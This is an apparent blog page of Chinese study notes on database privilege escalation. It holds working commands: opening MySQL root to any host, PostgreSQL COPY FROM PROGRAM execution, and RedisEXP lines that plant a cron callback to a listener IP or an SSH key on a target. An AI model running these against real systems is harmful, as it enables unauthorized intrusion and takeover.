@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>数据库提权流程与多类型数据库攻击方式总结</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@数据库提权流程与多类型数据库攻击方式总结 - Hzhsec home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/3.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://www.hzhsec.top//index.xml" title="Hzhsec home">
+
+    
+
+
+    <meta property="og:title" content="数据库提权流程与多类型数据库攻击方式总结" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/3.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2025-11-16T16:30:00+08:00" />
+<meta property="article:modified_time" content="2025-11-16T16:30:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="数据库提权流程与多类型数据库攻击方式总结"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://www.hzhsec.top/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "数据库提权流程与多类型数据库攻击方式总结",
+      "item": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/3.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "数据库提权流程与多类型数据库攻击方式总结",
+  "name": "数据库提权流程与多类型数据库攻击方式总结",
+  "description": "",
+  "keywords": [
+    "数据库提权", "SQL注入", "外联", "UDF", "Redis", "PostgreSQL", "第三方提权"
+  ],
+  "articleBody": "简介 本文总结数据库提权的完整流程，包括数据库凭据获取方法、外联开启、提权方式、利用工具、适用场景及相关命令。\n内容适用于 Web 实战、靶场、红队、应急响应及面试知识点整理。\n数据库提权流程 1. 获取数据库用户密码 常见凭据获取方式：\n网站存在 SQL 注入漏洞 数据库存储文件或备份文件泄露 网站源码配置文件泄露（如 config.php / application.yml） 外联爆破（需提前解决访问限制） 注：如果数据库不存在远程访问权限，可以通过 WebShell 本地连接或端口代理方式绕过。\n2. 利用数据库提权项目连接 可使用以下开源提权辅助工具进行数据库连接、操作或执行系统命令：\n工具名称 说明 项目地址 MDUT 常用数据库利用工具集成 https://github.com/SafeGroceryStore/MDUT Databasetools 数据库渗透集成工具 https://github.com/Hel10-Web/Databasetools RequestTemplate 请求模板与利用框架 https://github.com/1n7erface/RequestTemplate 3. 建立代理解决外联限制 两种典型方法：\n利用 已拥有 Web 权限 建立代理 → 数据库等同于 本地连接 利用权限执行 SQL 开启外联 → 让数据库支持远程访问 例如可使用：reGeorg、Neo-reGeorg、frp、chisel、socks5 tunnel 等。\n各类数据库提权方法与命令 1. 开启外联 MySQL GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'v3nSecurity' WITH GRANT OPTION; flush privileges; MSSQL EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE; Oracle ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE=EXCLUSIVE SCOPE=SPFILE; SHUTDOWN IMMEDIATE; STARTUP; 2. 数据库类型提权技术总结 MySQL（3306） 适用场景：PHP + MySQL 以 Web 入口提权 条件：可获取 root 密码（高版本需注意 secure-file-priv 限制） 提权技术：UDF、MOF、启动项、反弹 Shell MSSQL / SQL Server（1433） 适用场景：ASP.NET、Web API、企业内部系统 条件：sa 权限 提权技术：xp_cmdshell / sp_oacreate / CLR / 沙盒逃逸 Oracle（1521） 适用场景：大型企业、政府、金融系统、多站库分离架构 条件：数据库用户密码 利用方式：DBA / 普通用户 / 注入模式 说明：Oracle 具备多种系统级命令执行间接路径，但通常需突破权限层级 PostgreSQL（5432） 条件：数据库用户密码 核心利用点：支持通过 COPY FROM PROGRAM 执行系统命令 示例利用代码： DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; Redis（6379） 方向：数据库 → Linux 服务器 条件：未授权访问或成功登录 适用只限 Linux（如课程 Day78 提及） 利用技术：写 SSH 公钥、写计划任务、反弹 Shell、CVE 沙盒执行 工具：https://github.com/yuyan-sec/RedisEXP.git 复现环境搭建 wget http://download.redis.io/releases/redis-2.8.17.tar.gz tar xzf redis-2.8.17.tar.gz cd redis-2.8.17 make cd src ./redis-server 写入计划任务示例 RedisEXP_windows_amd64.exe -m cron -r 113.45.220.185 -L 118.178.86.67 -P 5432 写入 SSH 密钥示例 创建密钥 ssh-keygen (echo -e \"\\n\\n\";cat id_rsa.pub;echo -e \"\\n\\n\") \u003e 1.txt cat 1.txt 利用工具写入 RedisEXP_windows_amd64.exe -m ssh -r 113.45.220.185 -u root -s \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCQyB/pMfxpZbcuReiqglyxTRgjSvzyBfhzApVtFCy+AObFxaHYomAouZPSGlJ/LDAUt14+j3elFewlF9r/qXpA3elZ4Dm+cD3C6LU/jFgt7bSW5H5FM2xfiDgvKi9kwTdFSCoFlN/2Cm1KmazAFP455sw4Rf+ag17CzQWdJTD8yT/wq8vbUE0rFgU8S450Nvzai2lllPNPOOciq7EA37hg5QE+0w1zw2ZBJEy6EqqZiHjctM27UWgkPAhFX8eyaeMUaBO46LLPA2FCHHyDyq4ARkkoa7quB2FTBBXxnCXmTVxcO/s4JXC9yoChBmMDxIlkaLpHnQE9lKU2dcpT8fJyaEiwIPSbzV94VMM/5m9e+7+ue1a1KFW+NCDyoeAm9hWsQfmg3ej/hyHnw95mcO/pXaRb69gXgqM2nCp+XiAMS1Rp8K4zJuppULvD75Cj/hGWgniU2hnfb4pcnaQGLQk4wwt4UvuCLdeTsJdDzKyTDQk9i0cfxnhK6Zu7l13DpuE= dream@win\" Memcached（11211） 方向：数据库 → Linux 条件：远程可访问或本地访问 说明：无权限控制模块，可直接读写敏感内容 案例参考：https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg 第三方软件提权 可利用软件类别 类别 示例 远控类 Teamviewer、向日葵、Todesk、VNC、Radmin 密码类 各类浏览器、Xshell、Navicat、3389 服务类 FileZilla、Serv-U、Zend 文档类 WinRAR、WPS Office 原理总结 利用普通用户或 Web 用户收集、导出系统凭据进行权限提升 上传恶意文档或可执行文件，等待管理员触发执行（社工 + 权限继承） Cobalt Strike 典型利用场景 条件 利用方式 计算机用户 Teamviewer 计算机用户 NavicatPremium 计算机用户 / Web 权限 Winrar(CVE2023) 计算机用户 浏览器密码凭据 ",
+  "wordCount" : "274",
+  "inLanguage": "en",
+  "datePublished": "2025-11-16T16:30:00+08:00",
+  "dateModified": "2025-11-16T16:30:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://www.hzhsec.top/list/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows/3.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsec home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://www.hzhsec.top/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/static/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/static/hzhsec.png">
+
+<link rel="manifest" href="/static/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>数据库提权流程与多类型数据库攻击方式总结</h1>
+  </header>
+
+  <p>
+  <small>
+    November 16, 2025&nbsp;· 274 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-获取数据库用户密码">1. 获取数据库用户密码</a></li>
+    <li><a href="#2-利用数据库提权项目连接">2. 利用数据库提权项目连接</a></li>
+    <li><a href="#3-建立代理解决外联限制">3. 建立代理解决外联限制</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#1-开启外联">1. 开启外联</a>
+      <ul>
+        <li><a href="#mysql">MySQL</a></li>
+        <li><a href="#mssql">MSSQL</a></li>
+        <li><a href="#oracle">Oracle</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-数据库类型提权技术总结">2. 数据库类型提权技术总结</a>
+      <ul>
+        <li><a href="#mysql3306">MySQL（3306）</a></li>
+        <li><a href="#mssql--sql-server1433">MSSQL / SQL Server（1433）</a></li>
+        <li><a href="#oracle1521">Oracle（1521）</a></li>
+        <li><a href="#postgresql5432">PostgreSQL（5432）</a></li>
+        <li><a href="#redis6379">Redis（6379）</a></li>
+        <li><a href="#memcached11211">Memcached（11211）</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#可利用软件类别">可利用软件类别</a></li>
+        <li><a href="#原理总结">原理总结</a></li>
+        <li><a href="#cobalt-strike-典型利用场景">Cobalt Strike 典型利用场景</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><h1 id="简介">简介</h1>
+<p>本文总结数据库提权的完整流程，包括数据库凭据获取方法、外联开启、提权方式、利用工具、适用场景及相关命令。<br>
+内容适用于 Web 实战、靶场、红队、应急响应及面试知识点整理。</p>
+<hr>
+<h1 id="数据库提权流程">数据库提权流程</h1>
+<h2 id="1-获取数据库用户密码">1. 获取数据库用户密码</h2>
+<p>常见凭据获取方式：</p>
+<ul>
+<li>网站存在 SQL 注入漏洞</li>
+<li>数据库存储文件或备份文件泄露</li>
+<li>网站源码配置文件泄露（如 config.php / application.yml）</li>
+<li>外联爆破（需提前解决访问限制）</li>
+</ul>
+<blockquote>
+<p>注：如果数据库不存在远程访问权限，可以通过 WebShell 本地连接或端口代理方式绕过。</p>
+</blockquote>
+<hr>
+<h2 id="2-利用数据库提权项目连接">2. 利用数据库提权项目连接</h2>
+<p>可使用以下开源提权辅助工具进行数据库连接、操作或执行系统命令：</p>
+<table>
+<thead>
+<tr>
+<th>工具名称</th>
+<th>说明</th>
+<th>项目地址</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MDUT</td>
+<td>常用数据库利用工具集成</td>
+<td><a href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a></td>
+</tr>
+<tr>
+<td>Databasetools</td>
+<td>数据库渗透集成工具</td>
+<td><a href="https://github.com/Hel10-Web/Databasetools">https://github.com/Hel10-Web/Databasetools</a></td>
+</tr>
+<tr>
+<td>RequestTemplate</td>
+<td>请求模板与利用框架</td>
+<td><a href="https://github.com/1n7erface/RequestTemplate">https://github.com/1n7erface/RequestTemplate</a></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="3-建立代理解决外联限制">3. 建立代理解决外联限制</h2>
+<p>两种典型方法：</p>
+<ul>
+<li>利用 <strong>已拥有 Web 权限</strong> 建立代理 → 数据库等同于 <strong>本地连接</strong></li>
+<li>利用权限执行 SQL 开启外联 → 让数据库支持远程访问</li>
+</ul>
+<p>例如可使用：reGeorg、Neo-reGeorg、frp、chisel、socks5 tunnel 等。</p>
+<hr>
+<h1 id="各类数据库提权方法与命令">各类数据库提权方法与命令</h1>
+<h2 id="1-开启外联">1. 开启外联</h2>
+<h3 id="mysql">MySQL</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">GRANT</span> <span style="color:#66d9ef">ALL</span> <span style="color:#66d9ef">PRIVILEGES</span> <span style="color:#66d9ef">ON</span> <span style="color:#f92672">*</span>.<span style="color:#f92672">*</span> <span style="color:#66d9ef">TO</span> <span style="color:#e6db74">&#39;root&#39;</span><span style="color:#f92672">@</span><span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#66d9ef">IDENTIFIED</span> <span style="color:#66d9ef">BY</span> <span style="color:#e6db74">&#39;v3nSecurity&#39;</span> <span style="color:#66d9ef">WITH</span> <span style="color:#66d9ef">GRANT</span> <span style="color:#66d9ef">OPTION</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">flush</span> <span style="color:#66d9ef">privileges</span>;
+</span></span></code></pre></div><h3 id="mssql">MSSQL</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>RECONFIGURE;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;Ad Hoc Distributed Queries&#39;</span>, <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>RECONFIGURE;
+</span></span></code></pre></div><h3 id="oracle">Oracle</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">ALTER</span> <span style="color:#66d9ef">SYSTEM</span> <span style="color:#66d9ef">SET</span> REMOTE_LOGIN_PASSWORDFILE<span style="color:#f92672">=</span><span style="color:#66d9ef">EXCLUSIVE</span> <span style="color:#66d9ef">SCOPE</span><span style="color:#f92672">=</span>SPFILE;
+</span></span><span style="display:flex;"><span>SHUTDOWN <span style="color:#66d9ef">IMMEDIATE</span>;
+</span></span><span style="display:flex;"><span>STARTUP;
+</span></span></code></pre></div><hr>
+<h2 id="2-数据库类型提权技术总结">2. 数据库类型提权技术总结</h2>
+<h3 id="mysql3306">MySQL（3306）</h3>
+<ul>
+<li><strong>适用场景</strong>：PHP + MySQL 以 Web 入口提权</li>
+<li><strong>条件</strong>：可获取 root 密码（高版本需注意 <code>secure-file-priv</code> 限制）</li>
+<li><strong>提权技术</strong>：UDF、MOF、启动项、反弹 Shell</li>
+</ul>
+<hr>
+<h3 id="mssql--sql-server1433">MSSQL / SQL Server（1433）</h3>
+<ul>
+<li><strong>适用场景</strong>：ASP.NET、Web API、企业内部系统</li>
+<li><strong>条件</strong>：sa 权限</li>
+<li><strong>提权技术</strong>：xp_cmdshell / sp_oacreate / CLR / 沙盒逃逸</li>
+</ul>
+<hr>
+<h3 id="oracle1521">Oracle（1521）</h3>
+<ul>
+<li><strong>适用场景</strong>：大型企业、政府、金融系统、多站库分离架构</li>
+<li><strong>条件</strong>：数据库用户密码</li>
+<li><strong>利用方式</strong>：DBA / 普通用户 / 注入模式</li>
+<li><strong>说明</strong>：Oracle 具备多种系统级命令执行间接路径，但通常需突破权限层级</li>
+</ul>
+<hr>
+<h3 id="postgresql5432">PostgreSQL（5432）</h3>
+<ul>
+<li><strong>条件</strong>：数据库用户密码</li>
+<li><strong>核心利用点</strong>：支持通过 <code>COPY FROM PROGRAM</code> 执行系统命令</li>
+<li><strong>示例利用代码</strong>：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">DROP</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#66d9ef">IF</span> <span style="color:#66d9ef">EXISTS</span> cmd_exec;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> cmd_exec(cmd_output text);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">COPY</span> cmd_exec <span style="color:#66d9ef">FROM</span> PROGRAM <span style="color:#e6db74">&#39;id&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> cmd_exec;
+</span></span></code></pre></div><hr>
+<h3 id="redis6379">Redis（6379）</h3>
+<ul>
+<li><strong>方向</strong>：数据库 → Linux 服务器</li>
+<li><strong>条件</strong>：未授权访问或成功登录</li>
+<li><strong>适用只限 Linux（如课程 Day78 提及）</strong></li>
+<li><strong>利用技术</strong>：写 SSH 公钥、写计划任务、反弹 Shell、CVE 沙盒执行</li>
+<li><strong>工具</strong>：<a href="https://github.com/yuyan-sec/RedisEXP.git">https://github.com/yuyan-sec/RedisEXP.git</a></li>
+</ul>
+<h4 id="复现环境搭建">复现环境搭建</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wget http://download.redis.io/releases/redis-2.8.17.tar.gz
+</span></span><span style="display:flex;"><span>tar xzf redis-2.8.17.tar.gz
+</span></span><span style="display:flex;"><span>cd redis-2.8.17
+</span></span><span style="display:flex;"><span>make
+</span></span><span style="display:flex;"><span>cd src
+</span></span><span style="display:flex;"><span>./redis-server
+</span></span></code></pre></div><h4 id="写入计划任务示例">写入计划任务示例</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>RedisEXP_windows_amd64.exe -m cron -r 113.45.220.185 -L 118.178.86.67 -P 5432
+</span></span></code></pre></div><h4 id="写入-ssh-密钥示例">写入 SSH 密钥示例</h4>
+<ol>
+<li>创建密钥</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ssh-keygen
+</span></span><span style="display:flex;"><span>(echo -e &#34;\n\n&#34;;cat id_rsa.pub;echo -e &#34;\n\n&#34;) &gt; 1.txt
+</span></span><span style="display:flex;"><span>cat 1.txt
+</span></span></code></pre></div><ol start="2">
+<li>利用工具写入</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>RedisEXP_windows_amd64.exe -m ssh -r 113.45.220.185 -u root -s &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCQyB/pMfxpZbcuReiqglyxTRgjSvzyBfhzApVtFCy+AObFxaHYomAouZPSGlJ/LDAUt14+j3elFewlF9r/qXpA3elZ4Dm+cD3C6LU/jFgt7bSW5H5FM2xfiDgvKi9kwTdFSCoFlN/2Cm1KmazAFP455sw4Rf+ag17CzQWdJTD8yT/wq8vbUE0rFgU8S450Nvzai2lllPNPOOciq7EA37hg5QE+0w1zw2ZBJEy6EqqZiHjctM27UWgkPAhFX8eyaeMUaBO46LLPA2FCHHyDyq4ARkkoa7quB2FTBBXxnCXmTVxcO/s4JXC9yoChBmMDxIlkaLpHnQE9lKU2dcpT8fJyaEiwIPSbzV94VMM/5m9e+7+ue1a1KFW+NCDyoeAm9hWsQfmg3ej/hyHnw95mcO/pXaRb69gXgqM2nCp+XiAMS1Rp8K4zJuppULvD75Cj/hGWgniU2hnfb4pcnaQGLQk4wwt4UvuCLdeTsJdDzKyTDQk9i0cfxnhK6Zu7l13DpuE= dream@win&#34;
+</span></span></code></pre></div><hr>
+<h3 id="memcached11211">Memcached（11211）</h3>
+<ul>
+<li><strong>方向</strong>：数据库 → Linux</li>
+<li><strong>条件</strong>：远程可访问或本地访问</li>
+<li><strong>说明</strong>：无权限控制模块，可直接读写敏感内容</li>
+<li><strong>案例参考</strong>：<a href="https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg">https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg</a></li>
+</ul>
+<hr>
+<h1 id="第三方软件提权">第三方软件提权</h1>
+<h3 id="可利用软件类别">可利用软件类别</h3>
+<table>
+<thead>
+<tr>
+<th>类别</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>远控类</td>
+<td>Teamviewer、向日葵、Todesk、VNC、Radmin</td>
+</tr>
+<tr>
+<td>密码类</td>
+<td>各类浏览器、Xshell、Navicat、3389</td>
+</tr>
+<tr>
+<td>服务类</td>
+<td>FileZilla、Serv-U、Zend</td>
+</tr>
+<tr>
+<td>文档类</td>
+<td>WinRAR、WPS Office</td>
+</tr>
+</tbody>
+</table>
+<h3 id="原理总结">原理总结</h3>
+<ol>
+<li>利用普通用户或 Web 用户收集、导出系统凭据进行权限提升</li>
+<li>上传恶意文档或可执行文件，等待管理员触发执行（社工 + 权限继承）</li>
+</ol>
+<h3 id="cobalt-strike-典型利用场景">Cobalt Strike 典型利用场景</h3>
+<table>
+<thead>
+<tr>
+<th>条件</th>
+<th>利用方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>计算机用户</td>
+<td>Teamviewer</td>
+</tr>
+<tr>
+<td>计算机用户</td>
+<td>NavicatPremium</td>
+</tr>
+<tr>
+<td>计算机用户 / Web 权限</td>
+<td>Winrar(CVE2023)</td>
+</tr>
+<tr>
+<td>计算机用户</td>
+<td>浏览器密码凭据</td>
+</tr>
+</tbody>
+</table>
+<hr></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://www.hzhsec.top/list/base_bug/xss/xss6/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>JSONP 点击劫持 / 点击劫持 漏洞详解与防护</span></a>
+    
+    
+    <a class="next" href="http://www.hzhsec.top/list/za_xiang/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8-git-%E6%8E%A8%E9%80%81-%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E5%86%B3/"><span>记一次云服务器Git推送问题与解决</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
